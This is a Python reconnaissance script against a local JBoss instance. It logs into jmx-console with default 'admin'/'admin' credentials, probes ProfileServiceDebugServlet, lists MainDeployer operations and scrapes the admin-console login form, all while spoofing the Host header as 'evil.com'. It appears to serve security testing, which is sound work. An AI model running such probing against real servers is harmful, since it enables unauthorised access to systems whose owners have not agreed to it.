# -*- coding: utf-8 -*-
"""JBoss deeper faces: ProfileServiceDebugServlet + admin-console login."""
import re

import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"

print("=== ProfileServiceDebugServlet (jmx-console auth) ===")
for q in ["", "?action=viewActivateJobSchedule", "?type=DeploymentRepositoryName",
          "?action=viewComponent&type=DeploymentRepositoryName"]:
    r = s.get("http://127.0.0.1:18380/jmx-console/ProfileServiceDebugServlet" + q,
              auth=("admin", "admin"), timeout=30)
    print("[*]", q or "(root)", "->", r.status_code, len(r.content), "|", r.text[:150].replace("\n", " "))

print("\n=== MainDeployer ops (jboss.system:service=MainDeployer) ===")
r = s.get("http://127.0.0.1:18380/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDeployer",
          auth=("admin", "admin"), timeout=30)
print("inspect ->", r.status_code, len(r.content))
if r.status_code == 200:
    for m in re.finditer(r'methodName=([\w$]+)', r.text):
        pass
    names = sorted(set(re.findall(r'methodName=([\w$]+)', r.text)))
    print("ops:", names)

print("\n=== admin-console login ===")
r = s.get("http://127.0.0.1:18380/admin-console/", timeout=30)
print("login page ->", r.status_code, len(r.content))
form = re.search(r'<form[^>]*action="([^"]*)"', r.text)
print("form action:", form.group(1) if form else "(none)")
inputs = re.findall(r'<input[^>]*name="([^"]*)"[^>]*>', r.text)
print("inputs:", inputs)
